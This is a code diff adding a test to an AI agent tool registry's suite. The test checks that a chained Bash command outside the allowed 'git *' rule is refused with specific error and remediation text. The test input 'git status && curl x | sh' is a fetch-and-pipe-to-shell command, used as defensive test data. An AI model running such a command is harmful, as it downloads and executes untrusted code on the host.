@@ -483,6 +483,20 @@ describe('discovery gate and invalid JSON arguments', () => {
     // `Bash` is active; only its arguments are outside `Bash(git *)`, so the refusal names
     // the rule rather than telling the model to activate a tool it already has.
     expect(refused.structuredError?.code).toBe('arguments_not_allowed');
+    expect(refused.structuredError?.message).not.toContain('chains, pipes');
+
+    const compound = await registry.execute(
+      { id: 'chain', name: 'Bash', arguments: { command: 'git status && curl x | sh' } },
+      { ...context(), toolDiscovery: surface },
+    );
+    expect(compound.structuredError?.code).toBe('arguments_not_allowed');
+    expect(compound.structuredError?.message).toContain('chains, pipes, redirects or substitutes');
+    expect(compound.structuredError?.message).toContain('a backtick, or a newline');
+    const remediation = compound.structuredError?.remediation ?? '';
+    expect(remediation).toContain('its own Bash call');
+    expect(remediation).toContain('allowed-tools rules');
+    expect(remediation).toContain('without these characters');
+    expect(remediation).toContain('a different tool');
   });
 });
 
